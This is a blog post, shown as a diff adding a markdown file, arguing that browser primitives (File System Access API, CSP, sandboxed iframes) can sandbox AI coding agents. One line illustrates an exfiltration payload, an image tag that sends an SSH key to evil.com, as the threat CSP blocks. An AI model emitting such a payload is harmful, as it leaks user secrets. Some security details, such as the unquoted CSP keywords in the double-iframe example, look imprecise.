@@ -1,0 +1,149 @@
+---
+title: "the browser is your ai sandbox (and you're not using it)"
+date: "2026-01-26"
+description: "why docker containers for ai agents might be overkill when browsers have spent 30 years perfecting hostile code execution"
+tags: ["ai", "agents", "security", "web"]
+---
+
+here's a thought that's been bugging me: every time we build an ai coding agent, we reach for docker containers, vms, or fancy sandbox runtimes. anthropic's claude cowork spins up a multi-gigabyte container just to let claude touch your files safely.
+
+meanwhile, the browser on your machine has been running *actually hostile* code from random strangers for three decades. every time you click a sketchy link, your browser executes unknown javascript without breaking a sweat.
+
+maybe we're overcomplicating this.
+
+## the problem with ai agents
+
+the core issue is trust. when you give claude or gpt-4 access to your filesystem, you're hoping it won't:
+
+- read your ssh keys and exfiltrate them
+- delete important files
+- make network requests to servers you don't control
+- execute malicious code it hallucinates
+
+current solutions involve running agents inside isolated vms or containers. it works, but it's heavy. you need docker, you need to manage volumes, you need to think about networking. for a tool that's supposed to make development faster, there's a lot of friction.
+
+## enter the browser sandbox
+
+paul kinlan from google recently published a fascinating exploration of using browser security primitives for ai agent sandboxing. the core insight: browsers already solve this problem.
+
+the browser security model handles three critical areas:
+
+### 1. filesystem access
+
+the [file system access api](https://developer.chrome.com/docs/capabilities/web-apis/file-system-access) gives you granular control:
+
+```javascript
+// user picks a folder - that's your sandbox boundary
+const dirHandle = await window.showDirectoryPicker();
+
+// you can read/write anything inside that folder
+for await (const entry of dirHandle.values()) {
+  if (entry.kind === 'file') {
+    const file = await entry.getFile();
+    const contents = await file.text();
+    // process file...
+  }
+}
+
+// but you CAN'T escape to parent directories
+// the browser enforces this at the os level
+```
+
+it's essentially `chroot` but managed by the browser. users explicitly grant access to a specific folder, and the web app physically cannot escape that boundary. no container required.
+
+### 2. network isolation via csp
+
+content security policy is usually annoying. here it's your friend:
+
+```html
+<meta http-equiv="Content-Security-Policy" 
+      content="default-src 'none'; 
+               connect-src https://api.anthropic.com https://api.openai.com;
+               script-src 'self';">
+```
+
+this policy says: no network requests except to specific llm apis. an llm can't trick your app into loading an image that exfiltrates data because image loading is blocked entirely.
+
+the attack vector looks like this: an llm generates `<img src="https://evil.com/steal?data=YOUR_SSH_KEY">` and your browser happily sends that request. with csp, it just fails.
+
+### 3. sandboxed iframes for llm output
+
+here's where it gets clever. when displaying llm-generated content, use the iframe sandbox attribute:
+
+```html
+<iframe 
+  sandbox="allow-scripts"
+  srcdoc="<!-- llm generated html here -->"
+  csp="default-src 'none'">
+</iframe>
+```
+
+the iframe runs in a locked-down mode with no access to the parent page's dom, cookies, or network. even if the llm generates malicious javascript, it can't escape.
+
+for maximum paranoia, use the double-iframe technique:
+
+```html
+<iframe sandbox="allow-scripts" srcdoc="
+  <meta http-equiv='Content-Security-Policy' 
+        content='default-src none; script-src unsafe-inline;'>
+  <iframe sandbox='' srcdoc='
+    <!-- actual llm content here -->
+  '></iframe>
+">
+</iframe>
+```
+
+the outer iframe sets the network policy. the inner iframe is completely isolated. even if something breaks in the inner frame, it can't make network requests because the outer frame's csp blocks it.
+
+## a working example: co-do
+
+kinlan built [co-do.xyz](https://co-do.xyz) to demonstrate this approach. it's a claude cowork-style interface that:
+
+1. lets you select a local folder
+2. connects to your llm api of choice
+3. provides file editing tools to the ai
+4. runs entirely in the browser
+
+no docker. no containers. no multi-gigabyte downloads. just a web page that leverages decades of browser security engineering.
+
+## the tradeoffs
+
+this isn't a silver bullet. some limitations:
+
+**browser support**: file system access api is chromium-only. firefox and safari are lagging. for a production tool, you'd need fallbacks or accept limited browser support.
+
+**execution environment**: you can run wasm binaries safely, but you can't spin up arbitrary linux processes. tools that need to run `npm install` or `cargo build` won't work in a browser sandbox.
+
+**state persistence**: browser storage has limits. the origin-private filesystem helps, but it's not the same as a real filesystem for large projects.
+
+**offline capability**: if your llm api goes down, you're stuck. local models like ollama could help here.
+
+## when to use this
+
+browser sandboxing makes sense for:
+
+- **quick prototypes and demos** - skip the docker setup
+- **non-technical users** - no installation required
+- **document processing** - reading, analyzing, transforming files
+- **code review tools** - read-only access to a codebase
+- **personal productivity agents** - file organization, note-taking
+
+it's probably not right for:
+
+- **full dev environments** - you need terminal access
+- **ci/cd pipelines** - containers are the right abstraction there
+- **anything requiring native tools** - compilers, package managers, etc.
+
+## the bigger picture
+
+what excites me about this approach is the mindset shift. we keep building ai tools like they need special infrastructure, when the web platform already solved most of these problems.
+
+the browser is probably the most battle-tested sandbox on the planet. billions of users click on random links every day and their computers don't explode. that's not an accident—it's the result of decades of security work by browser vendors.
+
+maybe the next generation of ai tools should run in the browser first and only escape to containers when necessary. start with the lightweight solution and add complexity only when you need it.
+
+the irony is that we've had this incredible sandboxing technology sitting right there the whole time. we just forgot to use it.
+
+---
+
+*paul kinlan's original post at [aifoc.us](https://aifoc.us/the-browser-is-the-sandbox/) goes much deeper on the technical details. simon willison's [coverage](https://simonwillison.net/2026/Jan/25/the-browser-is-the-sandbox/) is worth reading too.*
